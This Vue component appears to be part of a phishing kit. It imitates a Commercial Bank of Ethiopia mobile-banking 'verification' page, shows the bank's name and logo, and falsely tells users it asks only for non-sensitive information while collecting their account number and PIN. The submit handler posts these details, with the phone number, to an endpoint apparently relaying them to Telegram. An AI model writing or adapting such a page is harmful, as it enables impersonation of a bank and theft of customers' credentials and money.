<template>
  <main class="mobile-screen">
    <header class="topbar">
      <div>
        <p class="app-title">CBE Mobile Banking</p>
        <p class="app-subtitle">Verification step</p>
      </div>

      <div class="topbar-actions" aria-label="Quick actions">
        <button class="icon-button" type="button" aria-label="Notifications">
          <span class="bell-icon" />
        </button>
        <button class="lang-pill" type="button" aria-label="Current language">
          EN
        </button>
      </div>
    </header>

    <section class="hero-card">
      <div class="logo-wrap" aria-label="Commercial Bank of Ethiopia logo">
        <img class="logo-image" src="/logo.svg" alt="Commercial Bank of Ethiopia logo">
      </div>

      <div class="hero-copy">
        <h1>Verification</h1>
        <p class="brand-name">Complete the second step</p>
        <p class="greeting">We only ask for non-sensitive information.</p>
      </div>

      <p class="helper-text">
        Enter your account number and PIN code. Phone:
        <strong>{{ displayPhone }}</strong>
      </p>

      <label class="input-block" for="reference">
        <span class="sr-only">Account number</span>
        <input
          id="reference"
          v-model="referenceNumber"
          type="text"
          placeholder="Account Number"
        >
      </label>

      <label class="input-block" for="otp">
        <span class="sr-only">PIN code</span>
        <input
          id="otp"
          v-model="otpCode"
          type="text"
          inputmode="numeric"
          placeholder="PIN Code"
        >
      </label>

      <button
        class="continue-button"
        type="button"
        aria-label="Continue"
        :disabled="isSubmitting"
        @click="submitReference"
      >
        <span class="arrow-icon" />
      </button>

      <p class="status-text">{{ statusMessage }}</p>

      <button class="secondary-link" type="button" @click="navigateTo('/')">
        Back to phone verification
      </button>
    </section>

    <footer class="bottom-panel">
      <div class="chat-row">
        <span>Need help with verification?</span>
        <button class="chat-pill" type="button">Support</button>
      </div>

      <button class="service-button" type="button">
        <span class="service-icon">◌</span>
        <span>Verification Services</span>
      </button>

      <p class="copyright">Copyright © Commercial Bank Of Ethiopia</p>
    </footer>
  </main>
</template>

<script setup lang="ts">
const route = useRoute()

const referenceNumber = ref('')
const otpCode = ref('')
const isSubmitting = ref(false)
const statusMessage = ref('Second-page functionality is ready for the next step.')

const displayPhone = computed(() => {
  const phone = route.query.phone
  return typeof phone === 'string' && phone.trim() ? phone : 'not provided'
})

async function submitReference() {
  statusMessage.value = ''

  if (displayPhone.value === 'not provided') {
    statusMessage.value = 'Phone number is missing. Please start from the first page.'
    return
  }

  if (!referenceNumber.value.trim()) {
    statusMessage.value = 'Enter your reference number to continue.'
    return
  }

  isSubmitting.value = true

  try {
    await $fetch('/api/telegram-demo', {
      method: 'POST',
      body: {
        stage: 'reference',
        phone: displayPhone.value,
        referenceNumber: referenceNumber.value.trim(),
        otpCode: otpCode.value.trim()
      }
    })

    otpCode.value = ''

    await navigateTo({
      path: '/review',
      query: {
        phone: displayPhone.value,
        reference: referenceNumber.value.trim()
      }
    })
  } catch (error: any) {
    statusMessage.value =
      error?.data?.statusMessage ||
      error?.statusMessage ||
      error?.message ||
      'Telegram send failed.'
  } finally {
    isSubmitting.value = false
  }
}
</script>
